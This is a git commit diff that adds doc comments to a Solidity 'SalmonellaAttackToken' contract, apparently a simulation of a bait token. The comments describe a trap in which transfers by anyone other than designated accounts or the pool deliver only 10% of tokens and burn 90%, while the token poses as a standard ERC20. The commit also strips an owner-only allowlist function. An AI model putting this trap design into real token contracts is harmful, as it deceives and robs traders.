7c2508ada0f855c063a10a95027e08be3e7fe5e2
ialexmp <77849655+ialexmp@users.noreply.github.com>
2023-06-19 11:04:04 +0200

    comments ERC20-Salmonella-Simulation-bait.sol

--- contracts/ERC20-Salmonella-Simulation-bait.sol
+++ contracts/ERC20-Salmonella-Simulation-bait.sol
@@ -2,6 +2,11 @@ pragma solidity ^0.8.0;
 
 import "../interfaces/IERC20.sol";
 
+/**
+     * The Salmonella contract operates on a straightforward principle. It functions as a standard ERC20 token, behaving similarly to other ERC20 tokens under normal circumstances. 
+     * However, it incorporates specific rules to identify transactions involving anyone other than the designated accounts. 
+*/
+
 contract SalmonellaAttackToken is IERC20 {
     string public name;
     string public symbol;
@@ -14,11 +19,9 @@ contract SalmonellaAttackToken is IERC20 {
     mapping(address => bool) addressesAllowed;
     mapping(address => mapping(address => uint256)) private _allowances;
 
-    modifier OnlyOwner(){
-    	require (msg.sender == salmonellaAttacker, "not you");
-    	_;
-    }
-    
+     /**
+     * @dev Sets the values for {name}, {symbol}, {decimals} and {totalSupply}.
+     */
     constructor(uint256 initialSupply) {
         name = "SalmonellaAttackToken";
         symbol = "SAT";
@@ -29,42 +32,84 @@ contract SalmonellaAttackToken is IERC20 {
         poolAddress = address(0); // setter
         emit Transfer(address(0), msg.sender, totalSupply);
     }
-    //setpoolAddress 
+
+    /**
+    * @dev set pool address to the dex pool
+    */
     function setPoolAddress(address pAddress) public {
     	poolAddress = pAddress;
     }
-    
+
+    /**
+     * @dev See {IERC20-balanceOf}.
+    */
     function balanceOf(address account) public view override returns (uint256) {   
     	return _balances[account];
     }
 
-    function transfer(address recipient, uint256 amount)
-        public
-        override
-        returns (bool)
+    /**
+     * @dev See {IERC20-transfer}.
+     *
+     * Requirements:
+     *
+     * - `recipient` cannot be the zero address.
+     * - the caller must have a balance of at least `amount`.
+     */
+    function transfer(address recipient, uint256 amount) public override returns (bool)
     {
         _transfer(msg.sender, recipient, amount);
         return true;
     }
 
+    /**
+     * @dev See {IERC20-allowance}.
+     */
     function allowance(address owner, address spender) public view override returns (uint256)
     {
         return _allowances[owner][spender];
     }
 
+    /**
+     * @dev See {IERC20-approve}.
+     *
+     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
+     * `transferFrom`. This is semantically equivalent to an infinite approval.
+     *
+     * Requirements:
+     * - `spender` cannot be the zero address.
+     */
     function approve(address spender, uint256 amount) public override returns (bool)
     {
         _approve(msg.sender, spender, amount);
         return true;
     }
 
+    /**
+     * @dev See {IERC20-transferFrom}.
+     *
+     * Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}.
+     *
+     * NOTE: Does not update the allowance if the current allowance is the maximum `uint256`.
+     *
+     * Requirements:
+     *  - `sender` and `recipient` cannot be the zero address.
+     *  - `sender` must have a balance of at least `amount`.
+     *  - the caller must have allowance for ``sender``'s tokens of at least `amount`.
+     */
     function transferFrom( address sender, address recipient, uint256 amount) public override returns (bool) 
     {
         _transfer(sender, recipient, amount);
         _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
         return true;
     }
-
+     /**
+     * @dev Moves `amount` of tokens from `sender` to `recipient`.
+     *
+     * Emits a {Transfer} event with Salmonella introduced: 
+     * Added uint256 trapAmount = (amount * 10) / 100; in balance function which sends only 10% out of 100% of the price bought and 90% of the tokens will get burned.
+     * If sender = salmonellaAttacker A or B == poolAddress -> Normal Transfer
+     * Otherwise, Execute Salmonella 
+     */
     function _transfer(address sender,address recipient, uint256 amount) internal virtual {
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(recipient != address(0), "ERC20: transfer to the zero address");
@@ -83,6 +128,17 @@ contract SalmonellaAttackToken is IERC20 {
         emit Transfer(sender, recipient, amount);
     }
 
+    /**
+     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
+     *
+     * This internal function is equivalent to `approve`, and can be used to  e.g. set automatic allowances for certain subsystems, etc.
+     *
+     * Emits an {Approval} event.
+     *
+     * Requirements:
+     * - `owner` cannot be the zero address.
+     * - `spender` cannot be the zero address.
+     */
     function _approve(address owner, address spender, uint256 amount) internal {
         require(owner != address(0), "ERC20: approve from the zero address");
         require(spender != address(0), "ERC20: approve to the zero address"
@@ -91,10 +147,4 @@ contract SalmonellaAttackToken is IERC20 {
         _allowances[owner][spender] = amount;
         emit Approval(owner, spender, amount);
     }
-    
-    function allowAddresses(address[] memory listOfAddressToAllow) public OnlyOwner{
-    	for (uint i=0; i<listOfAddressToAllow.length;i++){
-    		addressesAllowed[listOfAddressToAllow[i]] = true;
-    	}
-    }   
 }
